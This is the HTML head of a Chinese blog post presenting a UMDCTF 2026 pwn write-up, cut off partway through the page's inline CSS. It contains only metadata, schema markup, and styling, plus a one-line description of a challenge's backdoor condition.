@@ -1,0 +1,2912 @@
+<!DOCTYPE html>
+
+<html lang="zh-Hans" class="no-js immersion-color use-serif banner-as-cover toolbar-blur article-header-style-2 ">
+	
+<script defer src="https://cloud.umami.is/script.js" data-website-id="78be4cf3-55ef-4dbe-a039-95d178f2ab09"></script>
+<head>
+	<meta charset="UTF-8">
+			<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+		<meta property="og:title" content="UMDCTF 2026 Pwn wp by YHalo - YHalo&#039;s Blog">
+	<meta property="og:type" content="article">
+	<meta property="og:url" content="https://yhalo.cn/1978/umdctf-2026-pwn-wp-by-yhalo">
+				<meta name="description" content="ipv4 这道题是有后门的 调用win()的地方看下 a1不为0.0.0.0，并且要等于100.72.7.67&hellip;">
+			<meta property="og:description" content="ipv4 这道题是有后门的 调用win()的地方看下 a1不为0.0.0.0，并且要等于100.72.7.67&hellip;">
+	
+				<meta name="keywords" content="ctf,pwn">
+	
+					<meta property="og:image" content="https://yhalo.cn/wp-content/uploads/2026/05/屏幕截图-2026-05-12-105336.png" />
+	
+	<meta name="theme-color" content="#607d8b">
+	<meta name="theme-color-rgb" content="96,125,139">
+	<meta name="theme-color-origin" content="#607d8b">
+	<meta name="argon-enable-custom-theme-color" content="false">
+
+
+	<meta name="theme-card-radius" content="15">
+	<meta name="theme-card-radius-origin" content="15">
+
+	<meta name="theme-version" content="1.3.5">
+
+	<link rel="profile" href="http://gmpg.org/xfn/11">
+		<link rel="pingback" href="https://yhalo.cn/xmlrpc.php">
+			
+	<meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />
+
+	<!-- This site is optimized with the Yoast SEO plugin v27.9 - https://yoast.com/product/yoast-seo-wordpress/ -->
+	<title>UMDCTF 2026 Pwn wp by YHalo - YHalo&#039;s Blog</title>
+	<meta name="description" content="umdctf-2026-pwn-wp-by-yhalo" />
+	<link rel="canonical" href="https://yhalo.cn/1978/umdctf-2026-pwn-wp-by-yhalo/" />
+	<meta property="og:locale" content="zh_CN" />
+	<meta property="og:type" content="article" />
+	<meta property="og:title" content="UMDCTF 2026 Pwn wp by YHalo - YHalo&#039;s Blog" />
+	<meta property="og:description" content="umdctf-2026-pwn-wp-by-yhalo" />
+	<meta property="og:url" content="https://yhalo.cn/1978/umdctf-2026-pwn-wp-by-yhalo/" />
+	<meta property="og:site_name" content="YHalo&#039;s Blog" />
+	<meta property="article:published_time" content="2026-05-12T02:52:44+00:00" />
+	<meta property="article:modified_time" content="2026-05-12T02:54:03+00:00" />
+	<meta property="og:image" content="https://yhalo.cn/wp-content/uploads/2026/05/屏幕截图-2026-05-12-105336.png" />
+	<meta property="og:image:width" content="775" />
+	<meta property="og:image:height" content="571" />
+	<meta property="og:image:type" content="image/png" />
+	<meta name="author" content="Yhalo" />
+	<meta name="twitter:card" content="summary_large_image" />
+	<meta name="twitter:label1" content="作者" />
+	<meta name="twitter:data1" content="Yhalo" />
+	<meta name="twitter:label2" content="预计阅读时间" />
+	<meta name="twitter:data2" content="10 分" />
+	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https:\/\/schema.org","@graph":[{"@type":"Article","@id":"https:\/\/yhalo.cn\/1978\/umdctf-2026-pwn-wp-by-yhalo\/#article","isPartOf":{"@id":"https:\/\/yhalo.cn\/1978\/umdctf-2026-pwn-wp-by-yhalo\/"},"author":{"name":"Yhalo","@id":"https:\/\/yhalo.cn\/#\/schema\/person\/cea1ae4382ec2644ac99d76bee4ff7fb"},"headline":"UMDCTF 2026 Pwn wp by YHalo","datePublished":"2026-05-12T02:52:44+00:00","dateModified":"2026-05-12T02:54:03+00:00","mainEntityOfPage":{"@id":"https:\/\/yhalo.cn\/1978\/umdctf-2026-pwn-wp-by-yhalo\/"},"wordCount":277,"commentCount":0,"publisher":{"@id":"https:\/\/yhalo.cn\/#\/schema\/person\/cea1ae4382ec2644ac99d76bee4ff7fb"},"image":{"@id":"https:\/\/yhalo.cn\/1978\/umdctf-2026-pwn-wp-by-yhalo\/#primaryimage"},"thumbnailUrl":"https:\/\/yhalo.cn\/wp-content\/uploads\/2026\/05\/屏幕截图-2026-05-12-105336.png","keywords":["ctf","pwn"],"articleSection":["wp","文章"],"inLanguage":"zh-Hans","potentialAction":[{"@type":"CommentAction","name":"Comment","target":["https:\/\/yhalo.cn\/1978\/umdctf-2026-pwn-wp-by-yhalo\/#respond"]}]},{"@type":"WebPage","@id":"https:\/\/yhalo.cn\/1978\/umdctf-2026-pwn-wp-by-yhalo\/","url":"https:\/\/yhalo.cn\/1978\/umdctf-2026-pwn-wp-by-yhalo\/","name":"UMDCTF 2026 Pwn wp by YHalo - YHalo&#039;s Blog","isPartOf":{"@id":"https:\/\/yhalo.cn\/#website"},"primaryImageOfPage":{"@id":"https:\/\/yhalo.cn\/1978\/umdctf-2026-pwn-wp-by-yhalo\/#primaryimage"},"image":{"@id":"https:\/\/yhalo.cn\/1978\/umdctf-2026-pwn-wp-by-yhalo\/#primaryimage"},"thumbnailUrl":"https:\/\/yhalo.cn\/wp-content\/uploads\/2026\/05\/屏幕截图-2026-05-12-105336.png","datePublished":"2026-05-12T02:52:44+00:00","dateModified":"2026-05-12T02:54:03+00:00","description":"umdctf-2026-pwn-wp-by-yhalo","breadcrumb":{"@id":"https:\/\/yhalo.cn\/1978\/umdctf-2026-pwn-wp-by-yhalo\/#breadcrumb"},"inLanguage":"zh-Hans","potentialAction":[{"@type":"ReadAction","target":["https:\/\/yhalo.cn\/1978\/umdctf-2026-pwn-wp-by-yhalo\/"]}]},{"@type":"ImageObject","inLanguage":"zh-Hans","@id":"https:\/\/yhalo.cn\/1978\/umdctf-2026-pwn-wp-by-yhalo\/#primaryimage","url":"https:\/\/yhalo.cn\/wp-content\/uploads\/2026\/05\/屏幕截图-2026-05-12-105336.png","contentUrl":"https:\/\/yhalo.cn\/wp-content\/uploads\/2026\/05\/屏幕截图-2026-05-12-105336.png","width":775,"height":571},{"@type":"BreadcrumbList","@id":"https:\/\/yhalo.cn\/1978\/umdctf-2026-pwn-wp-by-yhalo\/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"首页","item":"https:\/\/yhalo.cn\/"},{"@type":"ListItem","position":2,"name":"UMDCTF 2026 Pwn wp by YHalo"}]},{"@type":"WebSite","@id":"https:\/\/yhalo.cn\/#website","url":"https:\/\/yhalo.cn\/","name":"YHalo's Blog","description":"yhalo&#039;s blog","publisher":{"@id":"https:\/\/yhalo.cn\/#\/schema\/person\/cea1ae4382ec2644ac99d76bee4ff7fb"},"potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https:\/\/yhalo.cn\/?s={search_term_string}"},"query-input":{"@type":"PropertyValueSpecification","valueRequired":true,"valueName":"search_term_string"}}],"inLanguage":"zh-Hans"},{"@type":["Person","Organization"],"@id":"https:\/\/yhalo.cn\/#\/schema\/person\/cea1ae4382ec2644ac99d76bee4ff7fb","name":"Yhalo","image":{"@type":"ImageObject","inLanguage":"zh-Hans","@id":"https:\/\/yhalo.cn\/wp-content\/uploads\/2025\/07\/cropped-微信图片_20250403175435.jpg","url":"https:\/\/yhalo.cn\/wp-content\/uploads\/2025\/07\/cropped-微信图片_20250403175435.jpg","contentUrl":"https:\/\/yhalo.cn\/wp-content\/uploads\/2025\/07\/cropped-微信图片_20250403175435.jpg","width":512,"height":512,"caption":"Yhalo"},"logo":{"@id":"https:\/\/yhalo.cn\/wp-content\/uploads\/2025\/07\/cropped-微信图片_20250403175435.jpg"},"sameAs":["https:\/\/yhalo.cn"],"url":"https:\/\/yhalo.cn\/author\/wyh\/"}]}</script>
+	<!-- / Yoast SEO plugin. -->
+
+
+<link rel='dns-prefetch' href='//fonts.googleapis.com' />
+<link rel="alternate" type="application/rss+xml" title="YHalo&#039;s Blog &raquo; UMDCTF 2026 Pwn wp by YHalo 评论 Feed" href="https://yhalo.cn/1978/umdctf-2026-pwn-wp-by-yhalo/feed/" />
+<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://yhalo.cn/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fyhalo.cn%2F1978%2Fumdctf-2026-pwn-wp-by-yhalo%2F" />
+<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://yhalo.cn/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fyhalo.cn%2F1978%2Fumdctf-2026-pwn-wp-by-yhalo%2F&#038;format=xml" />
+<style id="wp-img-auto-sizes-contain-inline-css">
+img:is([sizes=auto i],[sizes^="auto," i]){contain-intrinsic-size:3000px 1500px}
+/*# sourceURL=wp-img-auto-sizes-contain-inline-css */
+</style>
+<style id="wp-block-heading-inline-css">
+h1:where(.wp-block-heading).has-background,h2:where(.wp-block-heading).has-background,h3:where(.wp-block-heading).has-background,h4:where(.wp-block-heading).has-background,h5:where(.wp-block-heading).has-background,h6:where(.wp-block-heading).has-background{padding:1.25em 2.375em}h1.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h1.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]),h2.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h2.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]),h3.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h3.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]),h4.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h4.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]),h5.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h5.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]),h6.has-text-align-left[style*=writing-mode]:where([style*=vertical-lr]),h6.has-text-align-right[style*=writing-mode]:where([style*=vertical-rl]){rotate:180deg}
+/*# sourceURL=https://yhalo.cn/wp-includes/blocks/heading/style.min.css */
+</style>
+<style id="wp-block-paragraph-inline-css">
+.is-small-text{font-size:.875em}.is-regular-text{font-size:1em}.is-large-text{font-size:2.25em}.is-larger-text{font-size:3em}.has-drop-cap:not(:focus):first-letter{float:left;font-size:8.4em;font-style:normal;font-weight:100;line-height:.68;margin:.05em .1em 0 0;text-transform:uppercase}body.rtl .has-drop-cap:not(:focus):first-letter{float:none;margin-left:.1em}p.has-drop-cap.has-background{overflow:hidden}:root :where(p.has-background){padding:1.25em 2.375em}:where(p.has-text-color:not(.has-link-color)) a{color:inherit}p.has-text-align-left[style*="writing-mode:vertical-lr"],p.has-text-align-right[style*="writing-mode:vertical-rl"]{rotate:180deg}
+/*# sourceURL=https://yhalo.cn/wp-includes/blocks/paragraph/style.min.css */
+</style>
+<style id="wp-block-preformatted-inline-css">
+.wp-block-preformatted{box-sizing:border-box;white-space:pre-wrap}:where(.wp-block-preformatted.has-background){padding:1.25em 2.375em}
+/*# sourceURL=https://yhalo.cn/wp-includes/blocks/preformatted/style.min.css */
+</style>
+<link rel='stylesheet' id='argon_css_merged-css' href='https://yhalo.cn/wp-content/themes/argon/assets/argon_css_merged.css?ver=1.3.5' media='all' />
+<link rel='stylesheet' id='style-css' href='https://yhalo.cn/wp-content/themes/argon/style.css?ver=1.3.5' media='all' />
+<link rel='stylesheet' id='googlefont-css' href='//fonts.googleapis.com/css?family=Open+Sans:300,400,600,700|Noto+Serif+SC:300,600&#038;display=swap&#038;ver=7.1.4' media='all' />
+<style id="wp-emoji-styles-inline-css">
+
+	img.wp-smiley, img.emoji {
+		display: inline !important;
+		border: none !important;
+		box-shadow: none !important;
+		height: 1em !important;
+		width: 1em !important;
+		margin: 0 0.07em !important;
+		vertical-align: -0.1em !important;
+		background: none !important;
+		padding: 0 !important;
+	}
+/*# sourceURL=wp-emoji-styles-inline-css */
+</style>
+<style id="wp-block-library-inline-css">
+:root{--wp-block-synced-color:#7a00df;--wp-block-synced-color--rgb:122,0,223;--wp-bound-block-color:var(--wp-block-synced-color);--wp-editor-canvas-background:#ddd;--wp-admin-theme-color:#007cba;--wp-admin-theme-color--rgb:0,124,186;--wp-admin-theme-color-darker-10:#006ba1;--wp-admin-theme-color-darker-10--rgb:0,107,160.5;--wp-admin-theme-color-darker-20:#005a87;--wp-admin-theme-color-darker-20--rgb:0,90,135;--wp-admin-border-width-focus:2px}@media (min-resolution:192dpi){:root{--wp-admin-border-width-focus:1.5px}}.wp-element-button{cursor:pointer}:root .has-very-light-gray-background-color{background-color:#eee}:root .has-very-dark-gray-background-color{background-color:#313131}:root .has-very-light-gray-color{color:#eee}:root .has-very-dark-gray-color{color:#313131}:root .has-vivid-green-cyan-to-vivid-cyan-blue-gradient-background{background:linear-gradient(135deg,#00d084,#0693e3)}:root .has-purple-crush-gradient-background{background:linear-gradient(135deg,#34e2e4,#4721fb 50%,#ab1dfe)}:root .has-hazy-dawn-gradient-background{background:linear-gradient(135deg,#faaca8,#dad0ec)}:root .has-subdued-olive-gradient-background{background:linear-gradient(135deg,#fafae1,#67a671)}:root .has-atomic-cream-gradient-background{background:linear-gradient(135deg,#fdd79a,#004a59)}:root .has-nightshade-gradient-background{background:linear-gradient(135deg,#330968,#31cdcf)}:root .has-midnight-gradient-background{background:linear-gradient(135deg,#020381,#2874fc)}:root{--wp--preset--font-size--normal:16px;--wp--preset--font-size--huge:42px}.has-regular-font-size{font-size:1em}.has-larger-font-size{font-size:2.625em}.has-normal-font-size{font-size:var(--wp--preset--font-size--normal)}.has-huge-font-size{font-size:var(--wp--preset--font-size--huge)}:root .has-text-align-center{text-align:center}:root .has-text-align-left{text-align:left}:root .has-text-align-right{text-align:right}.has-fit-text{white-space:nowrap!important}#end-resizable-editor-section{display:none}.aligncenter{clear:both}.items-justified-left{justify-content:flex-start}.items-justified-center{justify-content:center}.items-justified-right{justify-content:flex-end}.items-justified-space-between{justify-content:space-between}.screen-reader-text{word-wrap:normal!important;border:0;clip-path:inset(50%);height:1px;margin:-1px;overflow:hidden;padding:0;position:absolute;width:1px;word-break:normal!important}.screen-reader-text:focus{background-color:#ddd;clip-path:none;color:#444;display:block;font-size:1em;height:auto;left:5px;line-height:normal;padding:15px 23px 14px;text-decoration:none;top:5px;width:auto;z-index:100000}html :where(.has-border-color){border-style:solid}html :where([style^=border-color],[style*=";border-color"],[style*="; border-color"]){border-style:solid}html :where([style^=border-top-color],[style*=";border-top-color"],[style*="; border-top-color"]){border-top-style:solid}html :where([style^=border-right-color],[style*=";border-right-color"],[style*="; border-right-color"]){border-right-style:solid}html :where([style^=border-bottom-color],[style*=";border-bottom-color"],[style*="; border-bottom-color"]){border-bottom-style:solid}html :where([style^=border-left-color],[style*=";border-left-color"],[style*="; border-left-color"]){border-left-style:solid}html :where([style^=border-width],[style*=";border-width"],[style*="; border-width"]){border-style:solid}html :where([style^=border-top-width],[style*=";border-top-width"],[style*="; border-top-width"]){border-top-style:solid}html :where([style^=border-right-width],[style*=";border-right-width"],[style*="; border-right-width"]){border-right-style:solid}html :where([style^=border-bottom-width],[style*=";border-bottom-width"],[style*="; border-bottom-width"]){border-bottom-style:solid}html :where([style^=border-left-width],[style*=";border-left-width"],[style*="; border-left-width"]){border-left-style:solid}html :where(img[class*=wp-image-]){height:auto;max-width:100%}:where(figure){margin:0 0 1em}html :where(.is-position-sticky){--wp-admin--admin-bar--position-offset:var(--wp-admin--admin-bar--height,0px)}@media screen and (max-width:600px){html :where(.is-position-sticky){--wp-admin--admin-bar--position-offset:0px}}
+
+/*# sourceURL=/wp-includes/css/dist/block-library/common.min.css */
+</style>
+<style id="wp-block-image-inline-css">
+.wp-block-image>a,.wp-block-image>figure>a{display:inline-block}.wp-block-image img{box-sizing:border-box;height:auto;max-width:100%;vertical-align:bottom}@media not (prefers-reduced-motion){.wp-block-image img.hide{visibility:hidden}.wp-block-image img.show{animation:show-content-image .4s}}.wp-block-image[style*=border-radius] img,.wp-block-image[style*=border-radius]>a{border-radius:inherit}.wp-block-image.has-custom-border img{box-sizing:border-box}.wp-block-image.aligncenter{text-align:center}.wp-block-image.alignfull>a,.wp-block-image.alignwide>a{width:100%}.wp-block-image.alignfull img,.wp-block-image.alignwide img{height:auto;width:100%}.wp-block-image .aligncenter,.wp-block-image .alignleft,.wp-block-image .alignright,.wp-block-image.aligncenter,.wp-block-image.alignleft,.wp-block-image.alignright{display:table}.wp-block-image .aligncenter>figcaption,.wp-block-image .alignleft>figcaption,.wp-block-image .alignright>figcaption,.wp-block-image.aligncenter>figcaption,.wp-block-image.alignleft>figcaption,.wp-block-image.alignright>figcaption{caption-side:bottom;display:table-caption}.wp-block-image .alignleft{float:left;margin:.5em 1em .5em 0}.wp-block-image .alignright{float:right;margin:.5em 0 .5em 1em}.wp-block-image .aligncenter{margin-left:auto;margin-right:auto}.wp-block-image :where(figcaption){margin-bottom:1em;margin-top:.5em}.wp-block-image.is-style-circle-mask img{border-radius:9999px}@supports ((-webkit-mask-image:none) or (mask-image:none)) or (-webkit-mask-image:none){.wp-block-image.is-style-circle-mask img{border-radius:0;-webkit-mask-image:url('data:image/svg+xml;utf8,<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg"><circle cx="50" cy="50" r="50"/></svg>');mask-image:url('data:image/svg+xml;utf8,<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg"><circle cx="50" cy="50" r="50"/></svg>');mask-mode:alpha;-webkit-mask-position:center;mask-position:center;-webkit-mask-repeat:no-repeat;mask-repeat:no-repeat;-webkit-mask-size:contain;mask-size:contain}}:root :where(.wp-block-image.is-style-rounded img,.wp-block-image .is-style-rounded img){border-radius:9999px}.wp-block-image figure{margin:0}.wp-lightbox-container{display:flex;flex-direction:column;position:relative}.wp-lightbox-container img{cursor:zoom-in}.wp-lightbox-container img:hover+button{opacity:1}.wp-lightbox-container button{align-items:center;backdrop-filter:blur(16px) saturate(180%);background-color:rgba(90,90,90,.25);border:none;border-radius:4px;cursor:zoom-in;display:flex;height:20px;justify-content:center;opacity:0;padding:0;position:absolute;right:16px;text-align:center;top:16px;width:20px;z-index:100}@media not (prefers-reduced-motion){.wp-lightbox-container button{transition:opacity .2s ease}}.wp-lightbox-container button:focus-visible{outline:3px auto rgba(90,90,90,.25);outline:3px auto -webkit-focus-ring-color;outline-offset:3px}.wp-lightbox-container button:hover{cursor:pointer;opacity:1}.wp-lightbox-container button:focus{opacity:1}.wp-lightbox-container button:focus,.wp-lightbox-container button:hover,.wp-lightbox-container button:not(:hover):not(:active):not(.has-background){background-color:rgba(90,90,90,.25);border:none}.wp-lightbox-overlay{box-sizing:border-box;cursor:zoom-out;height:100vh;left:0;overflow:hidden;position:fixed;top:0;visibility:hidden;width:100%;z-index:100000}.wp-lightbox-overlay .wp-lightbox-close-button{align-items:center;cursor:pointer;display:flex;font-family:inherit;gap:8px;justify-content:center;line-height:1;min-height:40px;min-width:40px;padding:0 4px;position:absolute;right:calc(env(safe-area-inset-right) + 16px);top:calc(env(safe-area-inset-top) + 16px);z-index:5000000}.wp-lightbox-overlay .wp-lightbox-close-button:focus,.wp-lightbox-overlay .wp-lightbox-close-button:hover,.wp-lightbox-overlay .wp-lightbox-close-button:not(:hover):not(:active):not(.has-background){background:none;border:none}.wp-lightbox-overlay .wp-lightbox-close-button:has(.wp-lightbox-close-text:not([hidden])) .wp-lightbox-close-icon svg{height:1em;width:1em}.wp-lightbox-overlay .wp-lightbox-close-icon svg{display:block}.wp-lightbox-overlay .wp-lightbox-navigation-button-next,.wp-lightbox-overlay .wp-lightbox-navigation-button-prev{align-items:center;bottom:16px;cursor:pointer;display:flex;font-family:inherit;gap:4px;justify-content:center;line-height:1;min-height:40px;min-width:40px;padding:0 8px;position:absolute;z-index:2000002}.wp-lightbox-overlay .wp-lightbox-navigation-button-next[hidden],.wp-lightbox-overlay .wp-lightbox-navigation-button-prev[hidden]{display:none}@media (min-width:960px){.wp-lightbox-overlay .wp-lightbox-navigation-button-next,.wp-lightbox-overlay .wp-lightbox-navigation-button-prev{bottom:50%;transform:translateY(-50%)}}.wp-lightbox-overlay .wp-lightbox-navigation-button-next:focus,.wp-lightbox-overlay .wp-lightbox-navigation-button-next:hover,.wp-lightbox-overlay .wp-lightbox-navigation-button-next:not(:hover):not(:active):not(.has-background),.wp-lightbox-overlay .wp-lightbox-navigation-button-prev:focus,.wp-lightbox-overlay .wp-lightbox-navigation-button-prev:hover,.wp-lightbox-overlay .wp-lightbox-navigation-button-prev:not(:hover):not(:active):not(.has-background){background:none;border:none;padding:0 8px}.wp-lightbox-overlay .wp-lightbox-navigation-button-next:has(.wp-lightbox-navigation-text:not([hidden])) .wp-lightbox-navigation-icon svg,.wp-lightbox-overlay .wp-lightbox-navigation-button-prev:has(.wp-lightbox-navigation-text:not([hidden])) .wp-lightbox-navigation-icon svg{display:block;height:1.5em;width:1.5em}.wp-lightbox-overlay .wp-lightbox-navigation-button-prev{left:calc(env(safe-area-inset-left) + 16px)}.wp-lightbox-overlay .wp-lightbox-navigation-button-next{right:calc(env(safe-area-inset-right) + 16px)}.wp-lightbox-overlay .wp-lightbox-navigation-icon svg{vertical-align:middle}.wp-lightbox-overlay .lightbox-image-container{height:var(--wp--lightbox-container-height);left:50%;overflow:hidden;position:absolute;top:50%;transform:translate(-50%,-50%);transform-origin:top left;width:var(--wp--lightbox-container-width);z-index:2000001}.wp-lightbox-overlay .wp-block-image{align-items:center;box-sizing:border-box;display:flex;height:100%;justify-content:center;margin:0;position:relative;transform-origin:0 0;width:100%;z-index:3000000}.wp-lightbox-overlay .wp-block-image img{height:var(--wp--lightbox-image-height);min-height:var(--wp--lightbox-image-height);min-width:var(--wp--lightbox-image-width);width:var(--wp--lightbox-image-width)}.wp-lightbox-overlay .wp-block-image figcaption{display:none}.wp-lightbox-overlay button{background:none;border:none}.wp-lightbox-overlay .scrim{background-color:#fff;height:100%;opacity:.9;position:absolute;width:100%;z-index:2000000}.wp-lightbox-overlay.active{visibility:visible}@media not (prefers-reduced-motion){.wp-lightbox-overlay.active{animation:turn-on-visibility .25s both}.wp-lightbox-overlay.active img{animation:turn-on-visibility .35s both}.wp-lightbox-overlay.show-closing-animation:not(.active){animation:turn-off-visibility .35s both}.wp-lightbox-overlay.show-closing-animation:not(.active) img{animation:turn-off-visibility .25s both}.wp-lightbox-overlay.zoom.active{animation:none;opacity:1;visibility:visible}.wp-lightbox-overlay.zoom.active .lightbox-image-container{animation:lightbox-zoom-in .4s}.wp-lightbox-overlay.zoom.active .lightbox-image-container img{animation:none}.wp-lightbox-overlay.zoom.active .scrim{animation:turn-on-visibility .4s forwards}.wp-lightbox-overlay.zoom.show-closing-animation:not(.active){animation:none}.wp-lightbox-overlay.zoom.show-closing-animation:not(.active) .lightbox-image-container{animation:lightbox-zoom-out .4s}.wp-lightbox-overlay.zoom.show-closing-animation:not(.active) .lightbox-image-container img{animation:none}.wp-lightbox-overlay.zoom.show-closing-animation:not(.active) .scrim{animation:turn-off-visibility .4s forwards}}@keyframes show-content-image{0%{visibility:hidden}99%{visibility:hidden}to{visibility:visible}}@keyframes turn-on-visibility{0%{opacity:0}to{opacity:1}}@keyframes turn-off-visibility{0%{opacity:1;visibility:visible}99%{opacity:0;visibility:visible}to{opacity:0;visibility:hidden}}@keyframes lightbox-zoom-in{0%{transform:translate(calc((-100vw + var(--wp--lightbox-scrollbar-width))/2 + var(--wp--lightbox-initial-left-position)),calc(-50vh + var(--wp--lightbox-initial-top-position))) scale(var(--wp--lightbox-scale))}to{transform:translate(-50%,-50%) scale(1)}}@keyframes lightbox-zoom-out{0%{transform:translate(-50%,-50%) scale(1);visibility:visible}99%{visibility:visible}to{transform:translate(calc((-100vw + var(--wp--lightbox-scrollbar-width))/2 + var(--wp--lightbox-initial-left-position)),calc(-50vh + var(--wp--lightbox-initial-top-position))) scale(var(--wp--lightbox-scale));visibility:hidden}}
+/*# sourceURL=https://yhalo.cn/wp-includes/blocks/image/style.min.css */
+</style>
+<style id="wp-block-list-inline-css">
+ol,ul{box-sizing:border-box}:root :where(.wp-block-list.has-background){padding:1.25em 2.375em}
+/*# sourceURL=https://yhalo.cn/wp-includes/blocks/list/style.min.css */
+</style>
+<style id="wp-block-code-inline-css">
+.wp-block-code{box-sizing:border-box}.wp-block-code code{direction:ltr;display:block;font-family:inherit;overflow-wrap:break-word;text-align:initial;white-space:break-spaces}
+/*# sourceURL=https://yhalo.cn/wp-includes/blocks/code/style.min.css */
+</style>
+<style id="wp-block-quote-inline-css">
+.wp-block-quote{box-sizing:border-box;overflow-wrap:break-word}.wp-block-quote.is-large:where(:not(.is-style-plain)),.wp-block-quote.is-style-large:where(:not(.is-style-plain)){margin-bottom:1em;padding:0 1em}.wp-block-quote.is-large:where(:not(.is-style-plain)) p,.wp-block-quote.is-style-large:where(:not(.is-style-plain)) p{font-size:1.5em;font-style:italic;line-height:1.6}.wp-block-quote.is-large:where(:not(.is-style-plain)) cite,.wp-block-quote.is-large:where(:not(.is-style-plain)) footer,.wp-block-quote.is-style-large:where(:not(.is-style-plain)) cite,.wp-block-quote.is-style-large:where(:not(.is-style-plain)) footer{font-size:1.125em;text-align:right}.wp-block-quote>cite{display:block}
+/*# sourceURL=https://yhalo.cn/wp-includes/blocks/quote/style.min.css */
+</style>
+
+<style id="classic-theme-styles-inline-css">
+/*! This file is auto-generated */
+.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
+/*# sourceURL=/wp-includes/css/classic-themes.min.css */
+</style>
+
+<style id="global-styles-inline-css">
+:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgb(6,147,227) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgb(252,185,0) 0%,rgb(255,105,0) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgb(255,105,0) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgb(255, 255, 255), 6px 6px rgb(0, 0, 0);--wp--preset--shadow--crisp: 6px 6px 0px rgb(0, 0, 0);}.wp-block-button{--wp--preset--dimension--25: 25%;--wp--preset--dimension--50: 50%;--wp--preset--dimension--75: 75%;--wp--preset--dimension--100: 100%;}:where(body) { margin: 0; }:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}body{padding-top: 0px;padding-right: 0px;padding-bottom: 0px;padding-left: 0px;}:root :where(.wp-element-button, .wp-block-button__link){background-color: #32373c;border-width: 0;color: #fff;font-family: inherit;font-size: inherit;font-style: inherit;font-weight: inherit;letter-spacing: inherit;line-height: inherit;padding-top: 